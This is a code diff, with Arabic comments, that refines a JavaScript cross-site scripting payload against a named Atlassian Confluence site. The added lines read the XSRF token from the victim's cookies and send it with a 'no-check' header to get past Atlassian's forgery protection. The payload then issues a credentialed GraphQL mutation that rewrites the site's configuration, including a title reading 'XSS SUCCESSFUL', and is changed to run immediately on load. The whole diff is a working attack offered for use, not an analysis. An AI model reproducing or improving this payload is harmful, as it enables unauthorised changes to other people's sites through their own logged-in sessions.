@@ -1,16 +1,28 @@
 function loadDoc1() {
+  // 1. محاولة استخراج توكن الـ XSRF من الصفحة
+  // غالبًا ما يكون موجودًا في وسم meta أو في الكوكيز المتاحة
+  var xsrfToken = "";
+  var nameEQ = "atlassian.xsrf.token=";
+  var ca = document.cookie.split(';');
+  for(var i=0;i < ca.length;i++) {
+    var c = ca[i].trim();
+    if (c.indexOf(nameEQ) == 0) xsrfToken = c.substring(nameEQ.length,c.length);
+  }
+
   var xhttp = new XMLHttpRequest();
-  
-  // المسار الصحيح يبدأ بـ /wiki/
   var url = "https://anshall.atlassian.net/wiki/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation";
 
   xhttp.open("POST", url, true);
 
+  // الرؤوس الأساسية
   xhttp.setRequestHeader("Content-type", "application/json");
   xhttp.setRequestHeader("Accept", "*/*");
   
-  // إضافة هذا الرأس مهم جداً لتجاوز فحص XSRF في Atlassian
+  // الرؤوس الأمنية المطلوبة لتجاوز حماية Atlassian
   xhttp.setRequestHeader("X-Atlassian-Token", "no-check");
+  if (xsrfToken) {
+    xhttp.setRequestHeader("X-XSRF-Token", xsrfToken);
+  }
 
   xhttp.withCredentials = true;
 
@@ -18,8 +30,8 @@ function loadDoc1() {
     "operationName": "ConfigurationFormConfigurationPageUpdateMutation",
     "variables": {
       "siteConfigInput": {
-        "siteTitle": "Hacked by XSS", 
-        "customContactMessage": "xxxx",
+        "siteTitle": "XSS SUCCESSFUL", // جرب اسماً واضحاً جداً للتأكد
+        "customContactMessage": "Modified via XSS",
         "isContactAdministratorsFormEnabled": true,
         "siteHomePage": "Confluence Home",
         "isEditorConversionForSiteEnabled": true,
@@ -46,12 +58,12 @@ function loadDoc1() {
 
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4) {
-      console.log("New Status: " + this.status);
-      console.log("Response: " + this.responseText);
+      console.log("Response Status: " + this.status);
+      console.log("Full Response: " + this.responseText);
     }
   };
 
   xhttp.send(data);
 }
 
-window.onload = loadDoc1;
+loadDoc1();
